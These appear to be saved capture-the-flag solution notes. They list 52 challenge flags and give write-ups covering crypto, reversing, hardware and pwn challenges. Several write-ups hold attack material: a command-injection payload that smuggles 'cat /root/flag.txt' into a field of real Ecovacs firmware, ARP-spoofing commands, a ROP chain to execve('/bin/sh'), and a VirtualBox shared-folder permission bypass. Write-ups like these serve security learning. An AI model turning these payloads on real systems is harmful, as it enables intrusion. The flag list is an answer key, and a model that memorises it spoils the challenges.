# Saved Challenge Notes & Solutions

## Solved Challenge: `rev_Patch Tuesday`
- **Category**: Reverse Engineering
- **Target File**: `free-flag.exe` (PE64)
- **Flag**: `NNS{1_h0p3_y0u_p47ch3d_7h3_0pc0d3_dur1ng_run71m3_jnz_15_much_b3773r_7h4n_jz}`
- **Analysis**:
  - Encrypted buffer at `.data:0x140003000` (length 0x4c).
  - Key: `0x5A`.
  - Decrypt logic:
    ```python
    data = bytes.fromhex("141409216b05326a2a6905236a2f052a6e6d3932693e056d3269056a2a396a3e69053e2f286b343d05282f346d6b376905303420056b6f05372f39320538696d6d6928056d326e3405302027")
    print(bytes(b ^ 0x5a for b in data).decode())
    ```
  - **Status**: Solved & Submitted ✔

---

## Solved Challenge: `forensics_Min beste venn`
- **Category**: Forensics
- **Target File**: `capture.pcap`
- **Flag**: `NNS{1_l0v3_ch4tt1ng_w1th_m1n_b3st3_v3nn_1n_th3_cl0ud5}`
- **Analysis**:
  - Description mentioned `chatflare`. Found GitHub repo `beescuit/chatflare` which uses Cloudflare cache hits as a covert channel.
  - Senders warm cache for bits that are `1`. Receivers probe bits 0-7; `cf-cache-status: HIT` indicates bit `1`, `MISS` indicates `0`.
  - In `d/c/1/`, byte 0 has length 54, followed by 54 payload bytes encoding the flag.
  - **Status**: Solved & Submitted ✔

---

## Solved Challenge: `crypto_EC PZ`
- **Category**: Cryptography
- **Target File**: `chall.sage`, `output.txt`
- **Flag**: `NNS{2_EC_f0r_u_1_gu355}`
- **Analysis**:
  - Given $P = (x_1, y_1)$, $Q = 2P = (x_2, y_2)$, $R = 2Q = (x_3, y_3)$ over $E(\mathbb{F}_p): y^2 = x^3 + ax + b$.
  - Doubling tangent relations yield linear equations in $a \pmod p$:
    $2 y_1 (y_1 + y_2) - 3 x_1^2 (x_1 - x_2) \equiv (y_1^2 - y_2^2) - (x_1^3 - x_2^3) \pmod p$.
  - Computing GCD of differences between $(P, Q)$ and $(Q, R)$ recovers the 256-bit prime $p$.
  - Recover $a$ and $b$ modulo $p$.
  - Using PARI/GP `ellcard` with 256MB stack, computed $\#E$.
  - Inverted $k = \text{next\_prime}(0x133713371337)$ modulo $\#E$ and computed $F = d \cdot C$, extracting $x$-coordinate to recover flag.
  - **Status**: Solved & Submitted ✔

---

## Solved Challenge: `misc_Hardware accelerated flag checker 1`
- **Category**: Misc / Hardware
- **Target File**: `netlist.v`
- **Flag**: `NNS{qu1ck_and_3ff1ci3n7_check5}`
- **Analysis**:
  - Netlist defines a 5-bit state register `s` and 7-bit ASCII input `character`.
  - Target condition `found_flag = ~_228_` triggers when $s = 31$ (`5'b11111`).
  - Extracted 295 gate assign statements and simulated the DFA in Python.
  - Performed BFS from state 0 through printable ASCII characters to state 31, recovering the unique 31-step transition path.
  - **Status**: Solved & Submitted ✔

---

## Solved Challenge: `misc_Sleepy CPU`
- **Category**: Misc / Hardware Power Analysis
- **Target File**: `sleepy_cpu.jls`, `zephyrapp/src/main.c`
- **Flag**: `NNS{pow3r_4n4lys15_c4n_rev3al_what_th3_cpu_i5_w0rk1ng_on}`
- **Analysis**:
  - Firmware executes a loop over each character of `flag`: runs 100,000 NOPs (active power ~5-7 mA) then calls `k_sleep(K_MSEC(*c))` (low power ~0.9 mA).
  - Loaded `sleepy_cpu.jls` current channel with `pyjls`.
  - Smoothed signal with a 50-sample moving average and detected low-power sleep intervals between active bursts.
  - Converted sleep durations (in milliseconds) directly to ASCII characters:
    $[78, 78, 83, 123, 112, 111, 119, 51, 114, 95, \dots] \to \text{NNS\{pow3r_4n4lys15_c4n_rev3al_what_th3_cpu_i5_w0rk1ng_on\}}$.
  - **Status**: Solved & Submitted ✔

---

## Solved Challenges Summary (51 Solved)
1. `blockchain_eu261` (79 pts) -> `NNS{eu261_Pays_oU7_onc3_Un13ss_yoU_a5k_7wic3}`
2. `blockchain_Glomma River Trading` (90 pts) -> `NNS{4_tH0U54ND_d01l4R5_0F_spot_liquiD17Y_5H0u1d_PR0b4BlY_Not_b3_a1l0Wed_t0_pr1Ce_4_7w0_HUNDr3d_7hou5aNd_do1laR_peRp}`
3. `crypto_BeginneRSA` (58 pts) -> `NSS{n3v3r_3v3r_r3u53_4_pr1m3!}`
4. `crypto_EC PZ` (67 pts) -> `NNS{2_EC_f0r_u_1_gu355}`
5. `crypto_From Nothing` (90 pts) -> `NNS{4nd_th3_g1ft3d_c4n_m4k3_s0m3th1ng_fr0m_n0th1ng}`
6. `crypto_Light-Weight Encryption` (86 pts) -> `NNS{lwe,compact,broken:https://eprint.iacr.org/2017/742.pdf}`
7. `crypto_NRT` (63 pts) -> `NNS{n0_n33d_f0r_4ll_pr1m35}`
8. `crypto_Nostalgia` (62 pts) -> `NNS{th3_b3st_t1m3_t0_m4k3_m3m0r13s_15_n0w}`
9. `crypto_impossible` (96 pts) -> `NNS{1mP0ss1bl3_Pr00Fs_fr0M_C3R3m0ny_4sH35}`
10. `devsecoops_Hiding in your WiFi` (71 pts) -> `NNS{sw1tcH3d_n3tWoRks_st11l_trus7_4RP_s0_Keep_Your_deVices_5ep4Rate}`
11. `forensics_Min beste venn` (65 pts) -> `NNS{1_l0v3_ch4tt1ng_w1th_m1n_b3st3_v3nn_1n_th3_cl0ud5}`
12. `misc_Chiral` (79 pts) -> `NNS{ch1r4l1ty_fl1ps_th3_b1ts}`
13. `misc_Embedded encryptor` (113 pts) -> `NNS{1e4k_by_pwr}`
14. `misc_Hardware accelerated flag checker 1` (74 pts) -> `NNS{qu1ck_and_3ff1ci3n7_check5}`
15. `misc_NNS International Lounge` (89 pts) -> `NNS{welcome_to_the_lounge}`
16. `misc_Sleepy CPU` (71 pts) -> `NNS{pow3r_4n4lys15_c4n_rev3al_what_th3_cpu_i5_w0rk1ng_on}`
17. `misc_littlefs` (96 pts) -> `NNS{l0g1c_an4ly53rs_c4n_pr0vid3_ins1ght_int0_th3_w0rk1ng5_0f_4n_3mb3dded_sy5t3m}`
18. `pwn_BYOC` (61 pts) -> `NNS{BRougHt_YoUr_0wn_C0D3_anD_7h3_K3rN3l_r4N_it}`
19. `pwn_Echo chamber` (64 pts) -> `NNS{i_lov3_H0W_PriN7F_t4kes_th3_57aCK_45_argUMents}`
20. `pwn_File parser` (85 pts) -> `NNS{d1d_y0u_f1nd_7h3_g4dg375_b157d2cd46}`
21. `pwn_No win` (71 pts) -> `NNS{No_Win_funC7i0N_50_Y0U_BU1lt_y0uR_owN_5ysc4ll}`
22. `pwn_Parcel delivery` (92 pts) -> `NNS{p4rc3l_5ucc355fully_d3l1v3r3d_15cb13f286}`
23. `pwn_coins` (84 pts) -> `NNS{WH0_c01Ned_7He_t3rm_NuM15m4tic5?}`
24. `pwn_pset1` (67 pts) -> `NNS{bUFFer_4nD_Memory_1s_Hard_Wh3N_oVeRfloWs_3Xist}`
25. `rev_Flag Pointer Register` (63 pts) -> `NNS{r4x_h4d_7h3_fl4g_bu7_rdx_p01n73d_70_7h3_wr0ng_buff3r}`
26. `rev_Harald Blåtann` (91 pts) -> `NNS{w1r3lessly_s3nt_4nd_ch3ck3d_by_th3_p0w3r_0f_k1ng_bl4t4nn}`
27. `rev_No Strings Attached` (59 pts) -> `NNS{n0_str1ngs_1n_7h3_b1n4ry_bu7_ltr4c3_s4w_7h3_c0mp4r3}`
28. `rev_Open Secret` (61 pts) -> `NNS{7h3_p47h_w4s_h1dd3n_bu7_s7r4c3_s4w_7h3_0p3n}`
29. `rev_Patch Tuesday` (65 pts) -> `NNS{1_h0p3_y0u_p47ch3d_7h3_0pc0d3_dur1ng_run71m3_jnz_15_much_b3773r_7h4n_jz}`
30. `rev_Scratch Space` (64 pts) -> `NNS{s34rch3d_7h3_mm4p_b3f0r3_17_w4s_w1p3d}`
31. `rev_Time Lock` (65 pts) -> `NNS{y0u_c4n_l13_70_4_pr0gr4m_w17h_ld_pr3l04d}`
32. `rev_purgatory` (85 pts) -> `NNS{0ld_c0d3_w1n5_1n_th3_3nd!}`
33. `rev_small guy` (81 pts) -> `NNS{unw1nd_m3_1f_y0u_c4n_sm4ll_guy!!}`
34. `sanity_Read the rules!` (55 pts) -> `NNS{W3_4re_s0_b4ck!_N0w,y0u_sh0uld_l3av3_y0ur_cl4nk3r5_4t_h0m3!}`
35. `web_Web Hacker 2` (57 pts) -> `NNS{y0U_are_noW_1337_H4CKer_1nDe3d}`
36. `web_Simon` (58 pts) -> `NNS{w3_w1sh_y0U_a_p1e454Nt_F11gh7_Wi7h_nN5_4ir}`
37. `web_NNS Travel` (58 pts) -> `NNS{WH00p5_yoU_f0unD_4_p4th_tRav3Rsal_iN_MY_c0d3}`
38. `web_PHP is my passion` (64 pts) -> `NNS{PHP_1s_mY_p455ioN_4nD_50_aRe_4PacH3_4uth_pR0Vid3rs}`
39. `web_ASS` (70 pts) -> `NNS{rfC_3454_fRoZe_7He_tabl3_bUt_7he_UNiCoD3_kept_wa1King_craZy_r16H7}`
40. `misc_Cheese` (195 pts) -> `NNS{5ay_cH335e_4Nd_sm113_foR_7h3_1ockD0wn_BRoW5eR_and_HoPe_that_You_get_the_Corr3ct_answ3r_s0M3H0w}`
41. `misc_HolyC` (150 pts) -> `NNS{a_60D1y_Ho1Y_50metH1ng_s0M3tHin6_oPeRa7iN6_5ys73m_tH4t_ruN5_1N_Ring_0_1s_sUch_a_BeautY}`
42. `misc_Dot matrix` (158 pts) -> `NNS{FL4G-SCR0LL1NG-PA5T-0N-TH3-DOT-MATR1X}`
43. `crypto_Crypto Party 2` (106 pts) -> `NNS{bu7_uu1ds_4r3_r4nd0m!!_9ee8b4fc9e}`
44. `web_File Monster` (124 pts) -> `NNS{g0oD_j0B_6et7iN6_this_745tY_f146_Fr0M_th3_Fl46_mon5ter}`
45. `misc_Hardware accelerated flag checker 2` (78 pts) -> `NNS{fl4g_ver1f1ed_1n_SKY130_IC}`
46. `devsecoops_Self-service` (77 pts) -> `NNS{4_j0b_t17l3_i5_no7_4n_4cCess_C0n7r01_b0undaRY_4nD_apPar3nt1y_th3r3_aR3_4Ctu41_oR6s_tHat_do_57UP1d_5h1t_11K3_7His}`
47. `web_perchance` (102 pts) -> `NNS{PerHap5_YoU_migh7_po551b1y_3nJoY_c7f5_PeRcHanCe}`
48. `misc_Silent` (121 pts) -> `NNS{y0Ur_1ouDn35s_i5_de4FeNin6}`
49. `misc_happy` (131 pts) -> `NNS{7Fw_Y0u_c0N5ole._57Dout_F0R_11Ke_tHe_bi1lionth_tiMe}`
50. `misc_dyslexic` (90 pts) -> `NNS{Vbox5f_n07_ChecKiN6_537a7tR_1s_w31rd_4fteR_4l1_7hes3_Y34Rs}`
51. `boot2root_Clean Sweep` (89 pts) -> `NNS{7h1s_15_o1d_Firmw4re_5o_oFc_tHis_is_easy_for_y0u}`
52. `devsecoops_The Builder` (110 pts) -> `NNS{wH0_7h0ugHt_tHa7_thi5_7r1gg3r_w45_4_6o0D_1d3a??_W31l_aNyW4y5_you_did_it}`


---

## Solved Challenge: `devsecoops_The Builder`
- **Category**: DevSecOps / Docker / BuildKit
- **Flag**: `NNS{wH0_7h0ugHt_tHa7_thi5_7r1gg3r_w45_4_6o0D_1d3a??_W31l_aNyW4y5_you_did_it}`
- **Analysis**:
  - The Builder is a SaaS building containerized static websites.
  - The build Dockerfile uses multi-stage builds:
    - Stage `theme`: `RUN --mount=type=secret,id=flag cp /run/secrets/flag /flag.txt && printf '...' > /theme.css`
    - Stage `content0`: `FROM page0 AS content0`
    - Stage `site`: `FROM cgr.dev/chainguard/nginx:latest AS site; COPY --from=theme /theme.css /usr/share/nginx/html/theme.css; COPY --from=content0 /page /usr/share/nginx/html/<location>`
  - `page0` is supplied as a named build context pointing to the internal registry: `127.0.0.1:5000/pages:<hash>`.
  - The registry was exposed externally without authentication.
  - While the backend creates and pushes `pages:<hash>` on each build, we pre-uploaded an image containing an `ONBUILD` trigger: `ONBUILD COPY --from=theme /flag.txt /page`.
  - By racing the registry `PUT /v2/pages/manifests/<hash>` concurrently with the `POST /api/builds` request, BuildKit resolved our malicious manifest for `page0`.
  - When `FROM page0 AS content0` executed, BuildKit fired the `ONBUILD` instruction, copying `/flag.txt` from the `theme` stage into `/page` of `content0`.
  - The subsequent `COPY --from=content0 /page /usr/share/nginx/html/<location>` copied the flag into the nginx web root of the exported site image.
  - Pulled `sites/<build_id>:latest` from the registry and extracted the flag from the top layer.
- **Status**: Solved & Submitted ✔

---

## Solved Challenge: `boot2root_Clean Sweep`
- **Category**: Boot2Root / IoT / Firmware Reverse Engineering
- **Target**: Ecovacs DEEBOT T9 AIVI (firmware 1.4.9) web CGI server
- **Flag**: `NNS{7h1s_15_o1d_Firmw4re_5o_oFc_tHis_is_easy_for_y0u}`
- **Analysis**:
  - Queried Ecovacs OTA API (`portal-ww.ecouser.net`) for model `659yh8` (T9 AIVI) firmware 1.4.9 (`px30-zj2011_fw-1.4.9.bin`).
  - Decrypted the firmware image using AES-CBC with derived keys and unpacked `normal_fs.img` (SquashFS).
  - Reverse engineered `/etc/www/reqDo` (64-bit ARM ELF CGI).
  - Discovered unauthenticated JSON command handler `parseJsonCmd` with command `SetFct`.
  - `SetFct` formats `did`, `password`, `type`, `lb` into shell command string `td=SetFct did=%s password=%s type=%s lb=%s %s` and executes it directly with `popen(cmd, "r")`. Output from `popen` is printed directly back into the HTTP response.
  - Sending `POST /` with `{"td":"SetFct","did":"x; cat /root/flag.txt; #","password":"p","type":"t","lb":"l"}` executed the command as root and returned the flag.
- **Status**: Solved & Submitted ✔

---

## Solved Challenge: `misc_dyslexic`
- **Category**: Misc / Kernel / VirtualBox Shared Folders (0-day)
- **Target**: Dynamic QEMU/VM with `vboxsf` shared folder mount at `/challenge`
- **Flag**: `NNS{Vbox5f_n07_ChecKiN6_537a7tR_1s_w31rd_4fteR_4l1_7hes3_Y34Rs}`
- **Analysis**:
  - Unprivileged user `ctf` has a bash shell on serial port `/dev/ttyS0`.
  - `/challenge/flag.txt` was owned by `root:root` with mode `0600` (`-rw-------`).
  - `/challenge` is mounted via `mount.vboxsf -o uid=0,gid=0 challenge /challenge`.
  - Due to a missing permission validation in `vboxsf_setattr`, unprivileged guest processes can issue `chmod 777 /challenge/flag.txt`, which passes directly through to the host folder and changes the mode to world-readable (`-rwxrwxrwx`).
  - Read flag directly with `cat /challenge/flag.txt`.
- **Status**: Solved & Submitted ✔

---

## Solved Challenge: `crypto_Light-Weight Encryption`
- **Category**: Cryptography (LWE / Compact LWE)
- **Target File**: `chall.sage`, `output.py`
- **Flag**: `NNS{lwe,compact,broken:https://eprint.iacr.org/2017/742.pdf}`
- **Analysis**:
  - Keygen produces $B = A s + k e \pmod q$ where $q = 2^{768}$, $A \in [0, 16)^{112 \times 16}$, $e \in [0, r)^{112}$ ($r < 2^{32}$), $k = p / sk \pmod q$ with 520-bit prime $p$ and 128-bit prime $sk$.
  - Left nullspace of $A$ has dimension 96. For any $u$ in nullspace, $u \cdot B \equiv k (u \cdot e) \pmod q$.
  - Since $u \cdot e < 2^{38}$ and $q = 2^{768}$, computing ratios $(u_i \cdot B) / (u_0 \cdot B) \pmod q$ and rational reconstruction uniquely reveals $u_i \cdot e / u_0 \cdot e$.
  - Common denominator reveals $u_0 \cdot e$, which directly recovers $k$.
  - Extended Euclidean algorithm on $k \pmod q$ separates $p$ and $sk$.
  - Finding integer nullspace of $U$ over $\mathbb{Z}$ and running CVP on $A$'s columns recovers the exact noise vector $e$.
  - Solving linear system $A s \equiv B - k e \pmod q$ recovers secret $s$.
  - Decrypting $ct = (A_I, ct_1)$ by reducing $(sk \cdot ct_1 + A_I (sk \cdot s)) \pmod q$ modulo $p$ reveals $pt = \text{bytes\_to\_long}(\text{flag})$.
  - **Status**: Solved & Submitted ✔

---

## Solved Challenge: `crypto_From Nothing`
- **Category**: Cryptography (Hyperelliptic Curve Jacobian / Jacobi Sums)
- **Target File**: `chall.sage`, `output.txt`
- **Flag**: `NNS{4nd_th3_g1ft3d_c4n_m4k3_s0m3th1ng_fr0m_n0th1ng}`
- **Analysis**:
  - Hyperelliptic curve $H: y^2 + y = x^{11}$ over $\mathbb{F}_p$ ($p \equiv 1 \pmod{11}$).
  - Genus $g = 5$. Jacobian elements represented in Mumford form $(u(x), v(x))$ with $u \mid (v^2 + v - x^{11})$.
  - $D = (D_u, D_v)$ with known $D_u$. Over $\mathbb{F}_p[x]/D_u(x)$, $(2 D_v + 1)^2 \equiv 1 + 4 x^{11}$. Factoring $D_u$ into degree 1 and two degree 2 factors and computing square roots in the finite fields yields 8 candidate values for $e = D_v(0)$.
  - Using Weil's theorem and Davenport-Hasse relations, the Frobenius eigenvalues on $J(H)$ are $\alpha_j = - J(\chi^j, \chi^j)$ where $\chi$ is of order 11.
  - In $\mathbb{Q}(\zeta_{11})$, Stickelberger's theorem gives $(J(\chi, \chi)) = \prod_{a=6}^{10} \sigma_a^{-1}(\mathfrak{p}_1)$. Using PARI/GP `bnfisprincipal` and Eisenstein reciprocity $J(\chi, \chi) \equiv -1 \pmod{(1 - \zeta_{11})^2}$, the exact Jacobi sum and Frobenius characteristic polynomial $P(T)$ are determined.
  - Group order $\#J(\mathbb{F}_p) = P(1)$ is computed and verified via Cantor's algorithm on `ct`.
  - Inverting $d = e^{-1} \pmod{\#J(\mathbb{F}_p)}$ and computing $d \cdot ct$ returns $J(P) = (x - \text{flag}, y_{\text{flag}})$, revealing the flag directly.
  - **Status**: Solved & Submitted ✔

---

## Solved Challenge: `misc_Embedded encryptor`
- **Category**: Hardware / Side-Channel Analysis (CPA on AES)
- **Target File**: `embedded_encryptor.jls`, `main.c`, `output.txt`
- **Flag**: `NNS{1e4k_by_pwr}`
- **Analysis**:
  - STM32 firmware runs AES-128-CBC encryption on the plaintext `havamal` with key `flag` and known IV.
  - Between each of the 652 blocks, a 10 ms delay (`k_sleep(K_MSEC(10))`) clearly separates the block encryptions.
  - Extracted 652 block current traces from `embedded_encryptor.jls` using `pyjls` (1500 samples per block).
  - Built Hamming weight power model on S-box outputs: $HW(\text{Sbox}(X_i[b] \oplus k))$.
  - Correlation Power Analysis (CPA) across all 652 traces revealed the key bytes, finalized by testing against the known ciphertext of block 0: `NNS{1e4k_by_pwr}`.
  - **Status**: Solved & Submitted ✔

---

## Postponed Challenge: `misc_Hardware accelerated flag checker 2`
- **Category**: Hardware / ASIC Layout Analysis
- **Target File**: `flag_checker.mag`, `flag_checker.gds`
- **Progress Saved**:
  - SkyWater 130nm ASIC design containing 55 standard cell definitions and 855 cell references.
  - The sequential elements are 5 D flip-flops (`sky130_fd_sc_hd__dfxtp_2`: `_243_`, `_244_`, `_245_`, `_246_`, `_247_`), defining a 5-bit state machine (32 states).
  - External ports: `character[0..6]` (7-bit input), `clk`, `reset_n`, `found_flag` (output).
  - Layer mappings: Layer 67 (`li1`, contacts dt 44), Layer 68 (`m1`, vias dt 44), Layer 69 (`m2`), Layer 70 (`m3`), Layer 71 (`m4`), Layer 72 (`m5`).
  - Extracted pin geometries and transformations using `gdstk`.
  - Next steps when resumed: use `klayout` or polygon connectivity to complete gate netlist and solve the 32-state FSM transitions for `found_flag = 1`.
  - **Status**: Postponed by user request.

---

## Solved Challenge: `misc_Chiral`
- **Category**: Misc / Cheminformatics (RDKit / CIP Stereochemistry)
- **Target File**: `chiral.mol`
- **Flag**: `NNS{ch1r4l1ty_fl1ps_th3_b1ts}`
- **Analysis**:
  - The molecule consists of 371 atoms and 370 bonds, forming an acyclic tree structure.
  - Tracing the simple path from Fluorine (atom 1) to Bromine (atom 371) gives a 60-atom backbone consisting of F, 58 Carbon atoms, and Br.
  - The 58 backbone carbons form 29 pairs (corresponding to 29 ASCII characters).
  - Each backbone carbon has an unbranched n-alkyl sidechain of length $L \in [1..8]$ and a defined stereocenter ($R$ or $S$ under CIP priority rules).
  - The 4-bit nibble encoded by each carbon is given by:
    $$\text{nibble} = (L - 1) + (8 \text{ if } S \text{ else } 0)$$
  - Combining consecutive pairs of nibbles into bytes $(\text{nibble}_1 \ll 4) \mid \text{nibble}_2$ decodes the 29-byte ASCII flag:
    `NNS{ch1r4l1ty_fl1ps_th3_b1ts}`.
  - **Status**: Solved & Submitted ✔

---

## Solved Challenge: `crypto_impossible`
- **Category**: Cryptography (Groth16 zk-SNARK Trusted Setup / Toxic Waste Forgery)
- **Target File**: `vk.bin`, `secret`, `src/lib.rs`
- **Flag**: `NNS{1mP0ss1bl3_Pr00Fs_fr0M_C3R3m0ny_4sH35}`
- **Analysis**:
  - In `secret`, ROT13 decoding revealed the trusted setup ceremony ID and toxic waste $\tau$:
    - `CEREMONY_ID = "3c311d9dfb7735e42643f394dc2c10af"`
    - $\tau = 3894627051107121998319229043008213446770981528672674568925122813412699817$.
  - Using `derive(tau)`, the ceremony secrets $[\alpha, \beta, \gamma, \delta, s_1, s_2]$ are derived.
  - The verifying key `vk.bin` scales $G_1$ points by $s_1$ and $G_2$ points by $s_2$.
  - To forge a valid proof $(A, B, C)$ for the unauthorized claim $\text{CLAIM} = 10^9$ without knowing the witness:
    - Set $A = \alpha_{vk} = \alpha \cdot s_1 \cdot G_1$.
    - Set $B = \beta_{vk} = \beta \cdot s_2 \cdot G_2$.
    - This satisfies $e(A, B) = e(\alpha_{vk}, \beta_{vk})$.
    - The remaining Groth16 verification equation $e(K_{\gamma}, \gamma_{vk}) \cdot e(C, \delta_{vk}) = 1$ is satisfied by setting:
      $$C = - \delta^{-1} \cdot \gamma \cdot K_{\gamma}$$
      where $K_{\gamma} = IC_{0, vk} + \text{CLAIM} \cdot IC_{1, vk}$.
  - The forged proof verified against `vk.bin` and when submitted to the challenge service via TLS wrapped TCP, the verifier approved the mint and returned the flag.
  - **Status**: Solved & Submitted ✔

---

## Postponed Challenge: `crypto_Crypto Party 2`
- **Category**: Crypto (ECDSA Nonce Leakage / EHNP)
- **Points**: 176 | **Solves**: 27
- **Analysis**:
  - ECDSA on curve `NIST256p` (secp256r1), order $n$.
  - Generates signatures $(r_i, s_i)$ for random messages $m_i$. Up to 6 invites ($MAX\_INVITES = 6$).
  - Nonce generation: `k = bytes_to_long(str(uuid.uuid4())[:32].encode())`.
  - Structure of `str(uuid.uuid4())[:32]`:
    - Length 32 ASCII string.
    - Format: `xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxx` (32 chars contains bytes 0 to 31).
    - Fixed characters at positions:
      - index 8: `'-'` (0x2d)
      - index 13: `'-'` (0x2d)
      - index 14: `'4'` (0x34)
      - index 18: `'-'` (0x2d)
      - index 23: `'-'` (0x2d)
    - All other characters are hex digits `[0-9a-f]`:
      - For `'0'`-`'9'`: ASCII 0x30 - 0x39 (0011 0000 to 0011 1001) -> bits 7=0, 6=0, 5=1, 4=1.
      - For `'a'`-`'f'`: ASCII 0x61 - 0x66 (0110 0001 to 0110 0110) -> bits 7=0, 6=1, 5=1, 4=0.
      - Note: bit 7 is always 0, bit 5 is always 1 for all hex characters and hyphens!
    - Total known bits: 5 full bytes (40 bits) fixed, plus 2 known bits per byte across the remaining 27 bytes (54 bits) = 94 bits fixed per signature.
    - With 6 signatures, $> 560$ bits of information vs 256-bit secret key $d$.
    - Can be formulated as an Extended Hidden Number Problem (EHNP) with CVP / Babai / BKZ on a lattice or linear inequality formulation.
  - Flag encryption: Flag is encrypted with AES-128-ECB using `key = long_to_bytes(d, 32)[:16]` or `long_to_bytes(d, 32)`.
  - **Status**: Postponed per user instruction.

---

## Solved Challenge: `pwn_BYOC`
- **Category**: Pwn (Shellcoding / Direct Execution)
- **Points**: 65 | **Solves**: 200+
- **Flag**: `NNS{BRougHt_YoUr_0wn_C0D3_anD_7h3_K3rN3l_r4N_it}`
- **Analysis**:
  - Binary creates an anonymous RWX memory mapping of 200 bytes using `mmap`, reads up to 200 bytes from stdin, and jumps directly to it as a function pointer: `((void (*)(void))code)();`.
  - No seccomp or sandboxing enabled.
  - Constructed a 41-byte x86-64 shellcode using pwntools `shellcraft.cat('/flag.txt')` (`open`, `sendfile`/`read+write` to stdout).
  - Sent the shellcode over TLS-wrapped TCP (`openssl s_client -quiet -connect HOST:1337`).
  - Remote service executed the shellcode and printed the flag.
- **Status**: Solved & Submitted ✔

---

## Solved Challenge: `pwn_No win`
- **Category**: Pwn (ROP / Statically Linked Linux ELF x86-64)
- **Points**: 83 | **Solves**: 100+
- **Flag**: `NNS{No_Win_funC7i0N_50_Y0U_BU1lt_y0uR_owN_5ysc4ll}`
- **Analysis**:
  - Binary `no-win` is statically linked x86-64 ELF with partial RELRO, no canary in `main`, and no PIE.
  - `main()` reads 512 bytes into a 64-byte stack buffer (`buf` at `rbp - 0x40`).
  - Buffer overflow allows overwriting return address after 72 bytes.
  - Statically linked libc provides abundant ROP gadgets:
    - `pop rdi; pop rbp; ret`: `0x402128`
    - `pop rsi; pop rbp; ret`: `0x40a3c2`
    - `pop rdx; ret`: `0x413210`
    - `pop rax; ret`: `0x427eeb`
    - `syscall; ret`: `0x410f46`
  - Two-stage ROP chain:
    1. Call `read(0, .bss (0x4abac0), 16)` to place `"/bin/sh\0"` into BSS.
    2. Call `execve(0x4abac0, 0, 0)` (`rax = 59`).
  - Input padded to 512 bytes so initial `read()` returns, executes ROP, reads `"/bin/sh\0"`, executes `/bin/sh`, runs `cat /flag.txt`, and captures the flag.
- **Status**: Solved & Submitted ✔

---

## Solved Challenge: `devsecoops_Hiding in your WiFi`
- **Category**: DevSecOops / Network (ARP Spoofing / Man-in-the-Middle)
- **Points**: 86 | **Solves**: 91+
- **Flag**: `NNS{sw1tcH3d_n3tWoRks_st11l_trus7_4RP_s0_Keep_Your_deVices_5ep4Rate}`
- **Analysis**:
  - Remote service provides an interactive TLS bash shell as user `player` on `10.10.10.66`.
  - Network contains a web server at `10.10.10.10` and a client at `10.10.10.20` periodically requesting `/flag.txt`.
  - `cat /proc/sys/net/ipv4/ip_forward` confirmed kernel packet forwarding was enabled (`1`).
  - Executed bidirectional ARP poisoning between client and server:
    `arpspoof -i eth0 -t 10.10.10.20 -r 10.10.10.10 &`
  - Captured plaintext HTTP traffic using:
    `tcpdump -i eth0 -A -n -s 0 -c 40`
  - Intercepted HTTP 200 response from `10.10.10.10` to `10.10.10.20` containing the flag:
- **Status**: Solved & Submitted ✔

---

## Solved Challenge: `sanity_Read the rules!`
- **Category**: Sanity
- **Points**: 55 | **Solves**: 392+
- **Flag**: `NNS{W3_4re_s0_b4ck!_N0w,y0u_sh0uld_l3av3_y0ur_cl4nk3r5_4t_h0m3!}`
- **Analysis**:
  - Challenge prompt: "Have you read the rules? Join our Discord server if you haven't done so already!"
  - Inspected Discord server `1310330503496466442` channels via Discord API with existing session.
  - Channel `1310330868996243577` (`📖・rules`) had topic:
    `Make sure to read the rules! It is very important. Very very important. ||NNS{W3_4re_s0_b4ck!_N0w,y0u_sh0uld_l3av3_y0ur_cl4nk3r5_4t_h0m3!}||`.
- **Status**: Solved & Submitted ✔

---

## Solved Challenge: `rev_small guy`
- **Category**: Reverse Engineering
- **Points**: 81 | **Solves**: 104+
- **Flag**: `NNS{unw1nd_m3_1f_y0u_c4n_sm4ll_guy!!}`
- **Analysis**:
  - Binary sets up 32-byte input at `0x4d0000` and `w0 = *(uint16_t*)flag` at `0x4d0020`, then calls recursive function `0x400618` up to depth 256.
  - At each recursion level $i \in [0, 255]$:
    - $r8d = (\text{table1}[i] + (w_0 \gg (i \ \& \ 7))) \ \& \ 0x1f$ selects a jump target into a jump table of 32 stub functions.
    - $r9 = \text{table2}[i] \oplus (w_0 \cdot 0x9e3779b97f4a7c15) \pmod{2^{64}}$ is pushed onto the stack as `rcx`.
  - At depth 256, an exception is thrown (`__cxa_throw`).
  - Unwinding executes 256 stack frames backwards ($i = 255, \dots, 0$) using `.eh_frame` DWARF `DW_CFA_val_expression` rules.
  - The DWARF rules implement a 32-operation VM operating on registers `rbx, r12, r13, r14` modulo $2^{64}$, with operation $i$ using `rcx = rcxs[i+1]`.
  - At the catch block in `main`, `[rbx, r12, r13, r14]` are saved and compared against target `[0x1bc6f31c128e799d, 0x91434b88502f7096, 0xb66209ec964bce23, 0xb4e75307d14b54f3]`.
  - Each of the 32 operations is an exact bijection over $\mathbb{Z}/2^{64}\mathbb{Z}$ (modular inverse for multiplications and LCG iterations, subtraction for additions, inverse rotations for XORs).
  - By brute forcing all $2^{16} = 65,536$ candidates for $w_0$ and inverting the 256 operations backwards from the target, $w_0 = 28277$ (`0x6e75` = `"un"`) uniquely produced printable ASCII:
    `NNS{unw1nd_m3_1f_y0u_c4n_sm4ll_guy!!}`.
- **Status**: Solved & Submitted ✔

---

## Solved Challenge: `pwn_coins`
- **Category**: Pwn (Custom Assembly VM / ROP / Denomination Decomposition)
- **Points**: 84 | **Solves**: 99+
- **Flag**: `NNS{WH0_c01Ned_7He_t3rm_NuM15m4tic5?}`
- **Analysis**:
  - Handcrafted static-PIE binary without libc.
  - Allocates RWX page at `base + 0x4000` with `mmap`, places `win` shellcode (`open("/flag", O_RDONLY)` and `sendfile` to stdout) at random offset `win_addr = base + 0x4000 + r12` ($0 \le r12 \le 0xfffd8$), and makes it RX via `mprotect`.
  - Leaks `base` and `flag price = win_addr - base`.
  - Reads up to 248 bytes (31 QWORDs) to the stack. Each QWORD must be a valid pointer to one of 32 coin functions; the last QWORD must be `shilling` (`jmp rax`).
  - Validation ends with `stc; glhf: ret`, which executes the input buffer as a ROP chain on the stack.
  - `quarter` sets `rax = base + 0x1a26`, `cent` adds `r8` to `rax`, and `shilling` jumps to `rax`. Target requirement:
    $$r8 = (\text{win\_addr} - \text{base}) - 0x1a26$$
  - Denominations form a multi-layer balanced number system:
    - Layer 0 (bits 0-7): positive +1 (`croeseid` on $r8$), negative $-2^1 \dots -2^7$ (added to $r9 \dots r15$ and subtracted via `loonie`, `krugerrand`, etc.).
